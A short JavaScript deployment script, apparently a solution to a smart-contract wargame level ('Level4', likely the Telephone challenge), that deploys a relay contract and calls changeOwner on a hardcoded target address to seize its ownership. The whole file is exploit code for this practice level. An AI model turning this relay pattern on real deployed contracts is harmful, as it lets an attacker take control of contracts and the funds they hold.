const level4 = async (deployer, TelephoneRelay) => {

    const targetAddress = '0xbf492b39546261e72e713878e01dbb3a71827ee2';

    console.log(`Exploiting Level4 target ${targetAddress}...`);

    console.log('Deploying TelephoneRelay...');
    const relay = await deployer.deploy(TelephoneRelay);
    console.log('Calling changeOwner...');
    await relay.changeOwner(targetAddress);
};

module.exports = level4;